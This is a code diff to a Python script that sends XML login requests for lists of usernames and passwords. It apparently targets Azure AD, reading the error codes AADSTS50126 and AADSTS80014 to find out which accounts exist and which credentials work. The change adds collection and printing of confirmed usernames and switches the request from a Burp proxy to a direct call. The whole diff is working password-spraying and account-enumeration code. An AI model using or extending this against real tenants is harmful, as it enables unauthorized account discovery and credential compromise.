@@ -73,6 +73,7 @@ def main():
     '''
 
     creds = []
+    users = []
 
     for username in usernames:
 
@@ -106,8 +107,8 @@ def main():
             xml = raw_xml.format(username=username, password=password, message_id=message_id, client_request_id=client_request_id, username_token=username_token)
 
             # Login Attempt
-            response = requests.post(login_url, headers=headers, data=xml, proxies=proxies, verify=False) # burp
-            #response = requests.post(login_url, headers=headers, data=xml)
+            #response = requests.post(login_url, headers=headers, data=xml, proxies=proxies, verify=False) # burp
+            response = requests.post(login_url, headers=headers, data=xml)
 
             if response.status_code == 400:
                 content = ET.fromstring(response.content)
@@ -128,9 +129,11 @@ def main():
 
                 if re.match("AADSTS50126" , text):
                     print("user {} exists, but the wrong password ({}) was entered".format(username, password))
+                    users.append(username)
 
                 if re.match("AADSTS80014" , text):
                     print("user {} exists, but the maximum Pass-through Authentication time was exceeded".format(username))
+                    users.append(username)
                     break
 
             if response.status_code == 200:
@@ -148,6 +151,15 @@ def main():
             print(cred)
     else:
         print("\nno valid creds found")
+    
+    if users:
+        print("\nUSERS")
+        print("---")
+        for user in set(users):
+            print(user)
+    else:
+        print("\nno valid usernames found")
+
 
 if __name__ == "__main__":
     main()
